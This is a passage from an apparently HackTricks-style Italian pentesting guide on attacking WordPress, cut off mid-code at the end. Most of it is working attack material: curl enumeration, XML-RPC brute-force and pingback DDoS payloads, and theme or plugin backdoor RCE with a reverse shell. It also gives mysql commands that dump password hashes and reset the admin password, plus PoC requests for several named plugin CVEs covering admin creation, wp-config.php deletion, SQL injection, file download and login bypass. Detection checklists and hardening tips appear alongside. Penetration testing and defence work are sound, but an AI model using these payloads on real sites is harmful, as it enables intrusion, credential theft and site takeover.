# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** quindi se modifichi qualche php del theme per ottenere RCE probabilmente userai quel percorso. Per esempio: Usando **theme twentytwelve** puoi **accedere** al file **404.php** in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In `wp-config.php` puoi trovare la password root del database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **File principali di WordPress**

- `index.php`
- `license.txt` contiene informazioni utili come la versione di WordPress installata.
- `wp-activate.php` è usato per il processo di attivazione via email quando si configura un nuovo sito WordPress.
- Cartelle di login (possono essere rinominate per nasconderle):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` è un file che rappresenta una funzionalità di WordPress che permette di trasmettere dati usando HTTP come meccanismo di trasporto e XML come meccanismo di codifica. Questo tipo di comunicazione è stato sostituito dalla WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- La cartella `wp-content` è la directory principale dove sono memorizzati plugin e theme.
- `wp-content/uploads/` è la directory dove vengono salvati i file caricati sulla piattaforma.
- `wp-includes/` è la directory dove sono archiviati i file core, come certificati, fonts, file JavaScript e widget.
- `wp-sitemap.xml` Nelle versioni di WordPress 5.5 e successive, WordPress genera una sitemap XML con tutti i post pubblici e i tipi di post e tassonomie pubblicamente interrogabili.

**Post exploitation**

- Il file `wp-config.php` contiene informazioni richieste da WordPress per connettersi al database come il nome del database, host del database, username e password, authentication keys e salts, e il prefisso delle tabelle del database. Questo file di configurazione può anche essere usato per attivare la modalità DEBUG, utile per il troubleshooting.

### Permessi utenti

- **Amministratore**
- **Editor**: Pubblica e gestisce i propri e gli altri post
- **Autore**: Pubblica e gestisce i propri post
- **Collaboratore**: Scrive e gestisce i propri post ma non può pubblicarli
- **Iscritto**: Naviga i post e modifica il proprio profilo

## **Enumerazione passiva**

### **Ottenere la versione di WordPress**

Controlla se riesci a trovare i file `/license.txt` o `/readme.html`

All'interno del **codice sorgente** della pagina (esempio da [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- File di collegamento CSS

![](<../../images/image (533).png>)

- File JavaScript

![](<../../images/image (524).png>)

### Ottieni plugin
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ottenere Temi
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Estrazione delle versioni in generale
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumerazione attiva

### Plugins and Themes

Probabilmente non riuscirai a trovare tutti i Plugins and Themes possibili. Per scoprirli tutti, dovrai **actively Brute Force a list of Plugins and Themes** (si spera esistano strumenti automatizzati che contengono queste liste).

### Users

- **ID Brute:** Ottieni utenti validi da un sito WordPress tramite Brute Forcing users IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se le risposte sono **200** o **30X**, significa che l'id è **valido**. Se la risposta è **400**, allora l'id è **invalido**.

- **wp-json:** Puoi anche provare a ottenere informazioni sugli utenti interrogando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un altro endpoint `/wp-json/` che può rivelare alcune informazioni sugli utenti è:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Nota che questo endpoint espone solo gli utenti che hanno pubblicato un post. **Verranno fornite solo informazioni sugli utenti che hanno questa funzione abilitata**.

Nota anche che **/wp-json/wp/v2/pages** potrebbe leak indirizzi IP.

- **Login username enumeration**: Quando effettui il login su **`/wp-login.php`** il **messaggio** è **diverso** e indica se lo **username esiste o meno**.

### XML-RPC

Se `xml-rpc.php` è attivo puoi eseguire un credentials brute-force o usarlo per lanciare attacchi DoS verso altre risorse. (Puoi automatizzare questo processo[ using this](https://github.com/relarizky/wpxploit) per esempio).

Per vedere se è attivo prova ad accedere a _**/xmlrpc.php**_ e invia questa richiesta:

**Verifica**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** sono alcuni dei metodi che possono essere usati per brute-force credentials. Se riesci a trovare uno di questi puoi inviare qualcosa del tipo:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
La stringa _"Nome utente o password non corretti"_ all'interno di una risposta con codice 200 dovrebbe apparire se le credenziali non sono valide.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando le credenziali corrette puoi caricare un file. Nella risposta apparirà il percorso ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Esiste anche un **modo più veloce** per brute-force credentials usando **`system.multicall`** poiché puoi provare più credenziali nella stessa richiesta:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Questo metodo è pensato per programmi e non per esseri umani, ed è obsoleto, quindi non supporta 2FA. Quindi, se hai creds validi ma l'ingresso principale è protetto da 2FA, **potresti essere in grado di abusare di xmlrpc.php per effettuare il login con quelle creds bypassando 2FA**. Nota che non sarai in grado di eseguire tutte le azioni che puoi fare tramite la console, ma potresti comunque riuscire a ottenere RCE come spiega Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Se riesci a trovare il metodo _**pingback.ping**_ nella lista puoi far sì che Wordpress invii una richiesta arbitraria a qualsiasi host/porta.\
Questo può essere usato per chiedere a **migliaia** di **siti** Wordpress di **accedere** a una singola **destinazione** (così viene causato un **DDoS** in quella destinazione) oppure puoi usarlo per far eseguire a **Wordpress** lo **scan** di una **internal network** (puoi indicare qualsiasi porta).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se ottieni **faultCode** con un valore **maggiore** di **0** (17), significa che la porta è aperta.

Dai un'occhiata all'uso di **`system.multicall`** nella sezione precedente per imparare come abusare di questo metodo per causare DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Questo file di solito si trova nella root del sito Wordpress: **`/wp-cron.php`**\
Quando questo file viene **acceduto** viene eseguita una **pesante** MySQL **query**, quindi potrebbe essere usato da **attaccanti** per **causare** un **DoS**.\
Inoltre, di default, il `wp-cron.php` viene chiamato a ogni caricamento di pagina (ogni volta che un client richiede una pagina di Wordpress), il che su siti ad alto traffico può causare problemi (DoS).

Si raccomanda di disabilitare Wp-Cron e creare un vero cronjob sull'host che esegua le azioni necessarie a intervalli regolari (senza causare problemi).

### /wp-json/oembed/1.0/proxy - SSRF

Prova ad accedere a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e il sito Wordpress potrebbe effettuare una richiesta verso di te.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Questo strumento verifica se esistono **methodName: pingback.ping** e il path **/wp-json/oembed/1.0/proxy** e, se presenti, prova a sfruttarli.

## Strumenti automatici
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Ottenere l'accesso sovrascrivendo un bit

Più che un vero attacco, è una curiosità. Nel CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) si poteva invertire 1 bit in qualsiasi file di wordpress. Quindi si poteva invertire il bit alla posizione `5389` del file `/var/www/html/wp-includes/user.php` per trasformare l'operazione NOT (`!`) in NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Pannello RCE**

**Modifica di un file php del tema in uso (credenziali admin necessarie)**

Aspetto → Theme Editor → 404 Template (a destra)

Cambia il contenuto con una php shell:

![](<../../images/image (384).png>)

Cerca su internet come puoi accedere a quella pagina aggiornata. In questo caso devi accedere qui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puoi usare:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
per ottenere una sessione.

## Plugin RCE

### PHP plugin

Potrebbe essere possibile caricare file .php come plugin.\
Crea il tuo php backdoor usando per esempio:

![](<../../images/image (183).png>)

Poi aggiungi un nuovo plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probabilmente apparentemente non succederà nulla, ma se vai in Media vedrai la tua shell caricata:

![](<../../images/image (462).png>)

Accedi e vedrai l'URL per eseguire il reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Questo metodo prevede l'installazione di un plugin maligno noto per essere vulnerabile e che può essere sfruttato per ottenere una web shell. Il processo viene effettuato tramite il WordPress dashboard come segue:

1. **Plugin Acquisition**: Il plugin viene ottenuto da una fonte come Exploit DB, ad esempio [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Naviga nel WordPress dashboard, poi vai a `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Una volta che il plugin è installato con successo, deve essere attivato tramite il dashboard.
4. **Exploitation**:
- Con il plugin "reflex-gallery" installato e attivato, può essere sfruttato poiché è noto per essere vulnerabile.
- Il framework Metasploit fornisce un exploit per questa vulnerabilità. Caricando il modulo appropriato ed eseguendo comandi specifici, è possibile stabilire una sessione meterpreter, ottenendo accesso non autorizzato al sito.
- Si nota che questo è solo uno dei molti metodi per sfruttare un sito WordPress.

Il contenuto include supporti visivi che mostrano i passaggi nel WordPress dashboard per installare e attivare il plugin. Tuttavia, è importante notare che sfruttare vulnerabilità in questo modo è illegale e non etico senza la corretta autorizzazione. Queste informazioni devono essere usate responsabilmente e solo in un contesto legale, come penetration testing con esplicita autorizzazione.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Da XSS a RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ è uno script progettato per elevare una vulnerabilità **Cross-Site Scripting (XSS)** a **Remote Code Execution (RCE)** o altre vulnerabilità critiche in WordPress. Per maggiori informazioni controlla [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Fornisce **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crea un utente in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Carica il tuo custom plugin (backdoor) su WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Modifica un Built-In Plugin in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Modifica un Built-In Theme in WordPress.
- _**(Custom) Custom Exploits:**_ Exploit personalizzati per Third-Party WordPress Plugins/Themes.

## Post Exploitation

Estrai username e password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambia la password dell'admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superficie d'attacco

Sapere come un plugin Wordpress può esporre funzionalità è fondamentale per trovare vulnerabilità nella sua funzionalità. Puoi vedere come un plugin potrebbe esporre funzionalità nei punti elencati di seguito e alcuni esempi di plugin vulnerabili in [**questo post del blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uno dei modi in cui un plugin può esporre funzioni agli utenti è tramite handler AJAX. Questi possono contenere bug di logica, autorizzazione o autenticazione. Inoltre, è abbastanza frequente che queste funzioni basino sia l'autenticazione sia l'autorizzazione sull'esistenza di un wordpress nonce che **qualsiasi utente autenticato nell'istanza Wordpress potrebbe avere** (indipendentemente dal suo ruolo).

Queste sono le funzioni che possono essere usate per esporre una funzione in un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'uso di `nopriv` rende l'endpoint accessibile da qualsiasi utente (anche non autenticati).**

> [!CAUTION]
> Inoltre, se la funzione sta solo verificando l'autorizzazione dell'utente con la funzione `wp_verify_nonce`, questa funzione verifica solo che l'utente sia autenticato, di solito non controlla il ruolo dell'utente. Quindi utenti con privilegi bassi potrebbero avere accesso ad azioni con privilegi elevati.

- **REST API**

È anche possibile esporre funzioni da wordpress registrando una REST API usando la funzione `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
La `permission_callback` è una funzione di callback che verifica se un dato utente è autorizzato a chiamare il metodo API.

**Se viene usata la funzione integrata `__return_true`, salterà semplicemente il controllo dei permessi utente.**

- **Accesso diretto al file php**

Ovviamente, Wordpress usa PHP e i file all'interno dei plugin sono direttamente accessibili dal web. Quindi, se un plugin espone una funzionalità vulnerabile che viene attivata semplicemente accedendo al file, sarà sfruttabile da qualsiasi utente.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Alcuni plugin implementano scorciatoie “trusted header” per integrazioni interne o reverse proxy e poi usano quell'header per impostare il contesto utente corrente per le richieste REST. Se l'header non è vincolato crittograficamente alla richiesta da un componente a monte, un attaccante può falsificarlo e colpire route REST privilegiate come amministratore.

- Impatto: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Header di esempio: `X-Wcpay-Platform-Checkout-User: 1` (forza l'ID utente 1, tipicamente il primo account amministratore).
- Route sfruttata: `POST /wp-json/wp/v2/users` con un array di ruolo elevato.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Perché funziona

- Il plugin mappa un header controllato dal client allo stato di autenticazione e salta i controlli di capability.
- Il core di WordPress si aspetta la capability `create_users` per questa route; l'hack del plugin la bypassa impostando direttamente il contesto dell'utente corrente dall'header.

Indicatori di successo attesi

- HTTP 201 con un body JSON che descrive l'utente creato.
- Un nuovo utente admin visibile in `wp-admin/users.php`.

Checklist di rilevamento

- Cerca con grep `getallheaders()`, `$_SERVER['HTTP_...']`, o vendor SDKs che leggono header personalizzati per impostare il contesto utente (es. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisiona le registrazioni REST per callback privilegiate che non hanno controlli robusti di `permission_callback` e invece si affidano agli header della richiesta.
- Cerca utilizzi delle funzioni core di gestione utenti (`wp_insert_user`, `wp_create_user`) all'interno di handler REST che sono protetti solo da valori di header.

### Cancellazione arbitraria di file non autenticata via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes e plugin frequentemente espongono handler AJAX tramite gli hook `wp_ajax_` e `wp_ajax_nopriv_`. Quando la variante **_nopriv_** è usata **il callback diventa raggiungibile da visitatori non autenticati**, quindi qualsiasi azione sensibile deve implementare inoltre:

1. Un **controllo di capability** (es. `current_user_can()` o almeno `is_user_logged_in()`), e
2. Un **CSRF nonce** validato con `check_ajax_referer()` / `wp_verify_nonce()`, e
3. **Stretta sanitizzazione / validazione degli input**.

Il tema multipurpose Litho (< 3.1) si è dimenticato di questi 3 controlli nella feature *Remove Font Family* e ha finito per includere il seguente codice (semplificato):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi introdotti da questo snippet:

* **Accesso non autenticato** – l'hook `wp_ajax_nopriv_` è registrato.
* **Nessun controllo nonce / capability** – qualsiasi visitatore può raggiungere l'endpoint.
* **Nessuna sanitizzazione del percorso** – la stringa controllata dall'utente `fontfamily` viene concatenata a un percorso del filesystem senza filtraggio, permettendo il classico traversal `../../`.

#### Sfruttamento

Un attaccante può eliminare qualsiasi file o directory **al di sotto della directory base degli uploads** (normalmente `<wp-root>/wp-content/uploads/`) inviando una singola HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Poiché `wp-config.php` si trova al di fuori di *uploads*, quattro sequenze `../` sono sufficienti in un'installazione predefinita. Eliminando `wp-config.php` WordPress viene forzato nella *procedura guidata d'installazione* al prossimo accesso, permettendo un takeover completo del sito (l'attaccante fornisce semplicemente una nuova configurazione DB e crea un utente admin).

Altri target impattanti includono file `.php` di plugin/theme (per compromettere plugin di sicurezza) o regole `.htaccess`.

#### Checklist di rilevamento

* Qualsiasi callback `add_action( 'wp_ajax_nopriv_...')` che chiama helper del filesystem (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenazione di input utente non sanitizzato nei path (cerca `$_POST`, `$_GET`, `$_REQUEST`).
* Assenza di `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

---

### Escalation di privilegi tramite ripristino di ruoli obsoleti e autorizzazione mancante (ASE "View Admin as Role")

Molti plugin implementano una funzionalità "view as role" o di cambio temporaneo di ruolo salvando il(i) ruolo(i) originale(i) in user meta in modo da poterli ripristinare successivamente. Se il percorso di ripristino si basa solo su parametri di richiesta (es., `$_REQUEST['reset-for']`) e su una lista mantenuta dal plugin senza verificare le capabilities e un nonce valido, questo si trasforma in una escalation di privilegi verticale.

Un esempio reale è stato trovato nel plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Il ramo di reset ripristinava i ruoli basandosi su `reset-for=<username>` se il nome utente compariva in un array interno `$options['viewing_admin_as_role_are']`, ma non effettuava né un controllo `current_user_can()` né una verifica del nonce prima di rimuovere i ruoli correnti e riaggiungere i ruoli salvati da user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Perché è sfruttabile

- Si affida a `$_REQUEST['reset-for']` e a un'opzione del plugin senza autorizzazione lato server.
- Se un utente aveva precedentemente privilegi più elevati salvati in `_asenha_view_admin_as_original_roles` e poi è stato declassato, può ripristinarli richiamando il percorso di reset.
- In alcune installazioni, qualsiasi utente autenticato potrebbe innescare un reset per un altro username ancora presente in `viewing_admin_as_role_are` (autorizzazione difettosa).

Sfruttamento (esempio)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sulle build vulnerabili questo rimuove i ruoli correnti e riaggiunge i ruoli originali salvati (es., `administrator`), escalando effettivamente i privilegi.

Detection checklist

- Cerca funzionalità di role-switching che persistono “original roles” in user meta (es., `_asenha_view_admin_as_original_roles`).
- Individua percorsi di reset/restore che:
- Read usernames from `$_REQUEST` / `$_GET` / `$_POST`.
- Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()` / `check_admin_referer()`.
- Authorize based on a plugin option array (es., `viewing_admin_as_role_are`) instead of the actor’s capabilities.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Alcuni plugin collegano helper di user-switching all'hook pubblico `init` e ricavano l'identità da un cookie controllato dal client. Se il codice chiama `wp_set_auth_cookie()` senza verificare autenticazione, capability e un nonce valido, qualsiasi visitatore non autenticato può forzare il login come un ID utente arbitrario.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Perché è sfruttabile

- Il hook pubblico `init` rende l'handler raggiungibile da utenti non autenticati (nessun controllo `is_user_logged_in()`).
- L'identità viene ricavata da un cookie modificabile dal client (`original_user_id`).
- La chiamata diretta a `wp_set_auth_cookie($uid)` effettua il login del richiedente come quell'utente senza alcun controllo di capability/nonce.

Sfruttamento (non autenticato)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Considerazioni WAF per WordPress/plugin CVEs

I WAF edge/server generici sono tarati per pattern ampi (SQLi, XSS, LFI). Molte vulnerabilità ad alto impatto in WordPress/plugin sono bug di logica/autenticazione specifici dell'applicazione che appaiono come traffico benigno a meno che il motore non comprenda le route di WordPress e la semantica dei plugin.

Offensive notes

- Mirare agli endpoint specifici dei plugin con payload puliti: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Provare prima i percorsi non autenticati (AJAX `nopriv`, REST con permissive `permission_callback`, shortcodes pubblici). I payload di default spesso riescono senza obfuscazione.
- Casi tipici ad alto impatto: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Non fare affidamento sulle signature generiche del WAF per proteggere CVE dei plugin. Implementa patch virtuali a livello applicativo specifiche per la vulnerabilità o aggiorna rapidamente.
- Preferisci controlli positive-security nel codice (capabilities, nonces, validazione rigorosa degli input) rispetto a filtri regex negativi.

## Protezione WordPress

### Aggiornamenti regolari

Assicurati che WordPress, i plugin e i temi siano aggiornati. Conferma inoltre che l'aggiornamento automatico sia abilitato in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Inoltre, **installa solo plugin e temi WordPress affidabili**.

### Plugin di sicurezza

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Altre raccomandazioni**

- Rimuovere l'utente predefinito **admin**
- Usare **password forti** e **2FA**
- Periodicamente **rivedere** i **permessi** degli utenti
- **Limitare i tentativi di login** per prevenire attacchi Brute Force
- Rinomina il file **`wp-admin.php`** e consenti l'accesso solo internamente o da determinati indirizzi IP.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Il plugin WP Job Portal recruitment esponeva un task **savecategory** che, in definitiva, esegue il seguente codice vulnerabile all'interno di `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemi introdotti da questo snippet:

1. **Unsanitised user input** – `parentid` proviene direttamente dalla richiesta HTTP.
2. **String concatenation inside the WHERE clause** – manca `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – anche se l'azione è eseguita tramite `admin-post.php`, l'unico controllo in atto è un **CSRF nonce** (`wp_verify_nonce()`), che qualsiasi visitatore può recuperare da una pagina pubblica che incorpora lo shortcode `[wpjobportal_my_resumes]`.

#### Sfruttamento

1. Recupera un nonce valido:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inietta SQL arbitrario sfruttando `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La risposta rivela il risultato della query iniettata o altera il database, dimostrando la presenza di SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Un altro task, **downloadcustomfile**, permetteva ai visitatori di scaricare **qualsiasi file sul disco** tramite path traversal. Il sink vulnerabile si trova in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` è controllato dall'attaccante e concatenato **senza sanitizzazione**. Di nuovo, l'unica barriera è una **CSRF nonce** che può essere recuperata dalla pagina resume.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Il server risponde con il contenuto di `wp-config.php`, leaking DB credentials and auth keys.

## Presa di controllo dell'account non autenticata via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Molti temi/plugin forniscono helper per "social login" esposti tramite admin-ajax.php. Se un'azione AJAX non autenticata (wp_ajax_nopriv_...) si fida di identificatori forniti dal client quando i dati del provider mancano e poi chiama wp_set_auth_cookie(), questo diventa un bypass completo dell'autenticazione.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
